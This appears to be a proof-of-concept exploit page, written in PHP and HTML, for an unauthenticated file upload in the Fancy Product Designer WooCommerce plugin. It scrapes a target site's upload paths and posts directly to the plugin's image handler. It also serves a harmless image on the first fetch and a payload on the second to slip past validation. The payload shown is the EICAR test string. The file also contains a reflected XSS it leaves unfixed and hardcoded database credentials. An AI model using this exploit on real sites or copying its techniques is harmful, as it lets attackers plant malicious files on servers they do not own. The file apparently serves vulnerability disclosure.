<?php

/* Setup database:

CREATE USER 'poc'@'localhost' IDENTIFIED BY 'P@$$word';
CREATE DATABASE poc;
GRANT ALL PRIVILEGES ON poc.* TO 'poc'@'localhost';
USE poc;
CREATE TABLE requests (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(64) NOT NULL
) ENGINE=INNODB;
*/

$DB_SERVER = "127.0.0.1:3306";
$DB_USER = "poc";
$DB_PASSWORD = 'P@$$word';
$DB_DBNAME = "poc";
$DB_TABLE_PREFIX = "";

$mysqli = new mysqli($DB_SERVER, $DB_USER, $DB_PASSWORD, $DB_DBNAME);
$mysqli->set_charset("utf8mb4");
if ($mysqli->connect_error) {
    die("Could not connect to database: " . $mysqli->connect_error);
}

// 1x1 px PNG file
$png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAC4jAAAuIwF4pT92AAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
// 1x1 px JPG file
$jpg = "/9j/4AAQSkZJRgABAQEBLAEsAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAP/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AKAA/9k=";
// EICAR test virus
$payload = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";

// Responds to a request with an arbitrary file download.
function send_file($filetype, $filename, $filedata) {
    header("Content-Description: File Transfer");
    header("Content-Type: $filetype");
    header("Content-Disposition: attachment; filename=".$filename);
    header("Content-Transfer-Encoding: BASE64");
    header("Expires: 0");
    header("Cache-Control: must-revalidate");
    header("Pragma: public");
    header("Content-Length: " . strlen($filedata));
    ob_clean();
    flush();
    echo $filedata;
    exit;
}

// Returns true if the given file has been requested before, meaning we should
// send the malicious file instead of the benign file.
function is_known_file($filename) {
    global $mysqli;
    global $DB_TABLE_PREFIX;
    $stmt = $mysqli->prepare("SELECT * FROM " . $DB_TABLE_PREFIX .
        "requests WHERE filename = ?");
    $stmt->bind_param("s", $filename);
    $stmt->execute();
    $result = $stmt->get_result();
    while ($row = $result->fetch_assoc()) {
        return true;
    }
    return false;
}

// Records the fact that the given file has been requested before so we know to
// send the malicious file if it is requested again.
function record_known_file($filename) {
    global $mysqli;
    global $DB_TABLE_PREFIX;
    $stmt = $mysqli->prepare("INSERT INTO " . $DB_TABLE_PREFIX .
        "requests (filename) VALUES (?)");
    $stmt->bind_param("s", $filename);
    $stmt->execute();
}

// Checks if the given site is vulnerable and loads the needed URLs and paths if
// it is.
if (isset($_REQUEST['target'])) {
    if (strpos($_REQUEST['target'], "http") === 0) {
        $targetContent = file_get_contents($_REQUEST['target']);
        preg_match('/uploadsDir: ?"([^,]*)",/', $targetContent, $matches);
        if ($matches) {
            $uploadsDir = $matches[1];
        }
        preg_match('/uploadsDirURL: ?"([^}]*)"/', $targetContent, $matches);
        if ($matches) {
            $uploadsDirURL = $matches[1];
        }
    }
}

// Sends the benign or malicious file in response to a request.
if (isset($_REQUEST['get'])) {
    $requested_file = $_REQUEST['get'];
    if (!is_known_file($requested_file)) {
        // respond to the first request with a benign file
        record_known_file($requested_file);
        if (strpos($_REQUEST['get'], '.jpg')) {
            send_file('image/jpg', $_REQUEST['get'], base64_decode($jpg));
        } else if (strpos($_REQUEST['get'], '.png')) {
            send_file('image/png', $_REQUEST['get'], base64_decode($png));
        }
    } else {
        // respond to the second request with the malicious payload
        if (strpos($_REQUEST['get'], '.jpg')) {
            send_file('image/jpg', $_REQUEST['get'], base64_decode($payload));
        } else if (strpos($_REQUEST['get'], '.png')) {
            send_file('image/png', $_REQUEST['get'], base64_decode($payload));
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Fancy Product Designer - Unrestricted File Upload</title>
    <style>
        * {
            font-family: Arial, sans-serif;
        }
    </style>
    <script>
        var checkIfVulnerable = function(e) {
            if (!e || e.key === 'Enter') {
                var url = document.getElementById('target-url').value;
                if (url) {
                    document.location.search = "?target=" + encodeURIComponent(url);
                }
            }
        };

        var exploit = function() {
            // create the URL the exploit will be posted to
            var tmp = document.createElement('a');
            tmp.href = (new URLSearchParams(document.location.search)).get('target');
            // Version 4.4.1 of FDP for WC did not check if the user was logged in
            // before allowing uploads using the fpd_custom_uplod_file action.
            // In 4.5.1, FPD does check this and blocks the upload for users who
            // aren't logged in. However, direct access to custom-image-handler.php
            // is not prevented, so we can use that to upload our files without
            // authentication anyway.
            var postURL = tmp.protocol + '//' + tmp.hostname +
                //'/wp-admin/admin-ajax.php?action=fpd_custom_uplod_file';
                '/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php';

            // create the URL of the payload
            var ext = document.getElementById('extension').value;
            var payloadURL = document.location.origin + document.location.pathname;
            payloadURL += '?get=' + Math.round(Math.random() * (99999999)) + ext;

            // load the form and submit the exploit
            (document.getElementById('url')).setAttribute('value', payloadURL);
            (document.getElementById('exploit-form')).setAttribute('action', postURL);
            (document.getElementById('exploit-form')).submit();
        };
    </script>
</head>
<body>
<div>Enter the URL of a page using Fancy Product Designer for WooCommerce:</div>
<!-- TODO: The $_REQUEST['target'] parameter is vulnerable to reflected XSS here. -->
<input id="target-url" type="text" onkeydown="checkIfVulnerable(event)" value="<?php if (isset($_REQUEST['target'])) {echo $_REQUEST['target'];} ?>">
<button onclick="checkIfVulnerable()">Check</button>

<?php
    if (isset($uploadsDir) && isset($uploadsDirURL)) {
        ?>
        <br><br>
        <h2>The site may be vulnerable!</h2>
        <div>uploadsDir: <?php echo $uploadsDir; ?></div>
        <div>uploadsDirURL: <?php echo $uploadsDirURL; ?></div>

        <br><br>
        <div>Select the file extension you want your payload to have on the server:</div>
        <select id="extension">
            <option>.jpeg</option>
            <option>.png</option>
            <option>.svg</option>
        </select>

        <br><br>
        <div>Select your payload:</div>
        <input type="file" disabled style="text-decoration: strike-through;"><span style="margin-left: -160px; background-color: #fff;">EICAR test virus</span>

        <br><br>
        <button style="font-size: 20px;" onclick="exploit()">Upload!</button>

        <form id="exploit-form" style="display: none;" method="post">
            <input type="text" id="save-on-server" name="saveOnServer" value="1">
            <input type="text" id="uploads-dir" name="uploadsDir" value="<?php echo $uploadsDir; ?>">
            <input type="text" id="uploads-dir-url" name="uploadsDirURL" value="<?php echo $uploadsDirURL; ?>">
            <input type="text" id="url" name="url" value="">
        </form>
        <?php
    } else if (isset($_REQUEST['target'])) {
        ?>
        <h2>The site does not appear to be vulnerable</h2>
        <?php
    }
?>

</body>
</html>